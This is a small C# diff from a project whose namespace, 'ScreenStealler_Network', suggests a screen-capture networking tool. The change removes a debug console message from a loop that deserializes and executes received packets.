@@ -90,7 +90,6 @@ namespace ScreenStealler_Network.Network
                                     {
                                         Packet_Base<T> packet = Deserialize_Packet(received_data);
                                         packet.Execute(this);
-                                        Console.WriteLine($"Execute");
                                     }
                                     else
                                         break;
